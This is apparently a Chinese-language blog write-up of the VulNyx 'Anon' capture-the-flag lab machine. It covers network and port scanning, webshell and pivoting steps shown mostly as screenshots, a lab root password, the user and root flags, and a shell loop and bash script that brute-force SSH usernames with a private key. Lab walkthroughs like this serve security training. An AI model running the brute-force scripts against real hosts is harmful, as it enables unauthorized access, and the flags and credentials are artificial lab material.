---
title: VulNyx Anon靶机复盘
author: LingMj
data: 2025-02-05
categories: [VulNyx]
tags: [nmap,respose,chisel,brute_name,docker]
description: 难度-Medium
---

## 网段扫描
```
root@LingMj:/home/lingmj/xxoo# arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:df:e2:a7, IPv4: 192.168.56.110
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.56.1    0a:00:27:00:00:12       (Unknown: locally administered)
192.168.56.100  08:00:27:57:02:0a       PCS Systemtechnik GmbH
192.168.56.136  08:00:27:ce:5c:e9       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.350 seconds (108.94 hosts/sec). 3 responded
```

## 端口扫描

```
root@LingMj:/home/lingmj/xxoo# nmap -p- -sC -sV 192.168.56.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-05 06:48 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.56.136
Host is up (0.0094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:CE:5C:E9 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.92 seconds
```

## 获取webshell
![图 0](../assets/images/4f75981d6cd41248b2c20d4761fcf48da58be78cb46835636ce43e2bf254479f.png)  
![图 1](../assets/images/b10142ac6616160071426427739ed123c0c5f46cdb07e8e98343892845dfb620.png)  

>来自flower大佬的poc
>
![图 2](../assets/images/f64875d1f4fb71ea662cc41e8eb4a9b5fa035615d261709e0e87df9b168da462.png)  
![图 3](../assets/images/4f729e75d9c17cd6651e1b3e85879a6c75c307800764d90abc653b6d1e790718.png)  

>接着群主的getshell，poc
>
![图 4](../assets/images/21eed4af96eea234c798c5869ed537d644ab13d1e3b810be3ccaed147194727e.png)  
![图 5](../assets/images/733eb2f2002a16dc851a6835b92201cf1b51739dbf96228fb16216bece824de1.png)  


## 提权

```
root@debian1:/var/log/apache2# nmap -p- 10.10.10.10/24
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-05 13:59 UTC

root@debian1:/var/log/apache2# ssh root@10.10.10.20
bash: ssh: command not found
root@debian1:/var/log/apache2# nmap -p- 10.10.10.10/24
Starting Nmap 7.93 ( https://nmap.org ) at 2025-02-05 13:59 UTC
Nmap scan report for 10.10.10.1
Host is up (0.000027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:EE:E1:39:28 (Unknown)

Nmap scan report for debian2.private (10.10.10.20)
Host is up (0.00013s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
2222/tcp open  EtherNetIP-1
MAC Address: 02:42:0A:0A:0A:14 (Unknown)

Nmap scan report for debian1 (10.10.10.10)
Host is up (0.000049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 256 IP addresses (3 hosts up) scanned in 27.20 seconds
```

>我socat失败了，选择利用chisel
>

![图 6](../assets/images/cd87f69cb89bd6366d1fafc516d9a0b9890abbde4fcf7b569dcdf34324bbe42e.png) 
![图 8](../assets/images/8c892268a925eb3818402d7cbdd26aa212e52abae70565ada058dd999c417429.png)  

![图 7](../assets/images/d75f8d9bf1ecb01c20a0fc83cc5dccd852d2f64b42896e70d26023c6895e44c6.png)  


>用户和密码：root:$uP3r_$3cUr3_D0ck3r
>

![图 9](../assets/images/83560400d36df015acc5b1bb9cfe8d9aad58f0f34e6de205faebfe5a9bd555c4.png)  

![图 10](../assets/images/c5f31194c1792ca80698efa6a2510f8fd41b0ce14edcc98ab9d5937851dec42e.png)  

![图 11](../assets/images/d7473f0036c638168c8a8348b228e4a5d769e77a006f01d482a6648e620d6435.png)  

>无密码使用脚本： for i in $(cat /usr/share/seclists/Usernames/Names/names.txt);do ssh $i@192.168.56.136 -i id;done 
>

![图 12](../assets/images/b6d304df77163cd6da6c81a4c19ee1a5ed16f5bef83a46934c8761eda43836c3.png)  

![图 13](../assets/images/5cbc1a8197d84a7a1f4885e8619d3904d00366c76234be9c130b6c5e6a3e3331.png)  

>好到这里结束了，非常有意思的靶场，不过上面没一样是我写的，后面复盘会补充自己的其他方案
>


>userflag:af13f20ce2fb4266b4d381cf8f60f85f
>
>rootflag:f3a421bdd1e5119f49c3fda29838cf79
>


>其他补充：21匿名登录的方案和robots.txt方案
>

![图 14](../assets/images/28846667b2f26519e8e3a548c5d61395a7949780767c56d944ba5864547b05e3.png)  
![图 15](../assets/images/faed8578c297f3ae6c6f7503226aa8c3bfd76805ba1de1f6b1cd4f1ca0d26d75.png)  
![图 16](../assets/images/09738ec9ecadb71bca9d9189d6586a193c235e6086a1c0ec4737cf582cc7ef9c.png)  
![图 17](../assets/images/e33191e5ff606d342503dbe34b996ee7f78f22585f3b5e1c57d3637b5208488c.png)  
![图 18](../assets/images/3140a40f7cfaf80046c5cdcfbcbfe80e30b0920c88c3fad196ab3ff3a249fccd.png)  

![图 19](../assets/images/b2cfd4e60566d327522885cecfdc50e6a5acff59eafa586dab17dde60fe16d07.png)  
![图 20](../assets/images/9b3cebdd7096df62b1e6baa5c255690ac0a838ac9e0c16c7d129ac81e9f6c1d2.png)  

>当然美化爆破ssh的方案也有
>


```
#!/bin/bash

host=your_host
user_file=brute_name_file
id_rsa_file=your_id_rsa


while read i
do
    timeout 1 ssh ${i}@$host -i $id_rsa_file id &>/dev/null
    if [ $? -eq 0 ];then
        echo "[+]Found: $i"
        break
    else
        echo "[-]test:  $i"
    fi
    sleep 0.1
done < $user_file
```
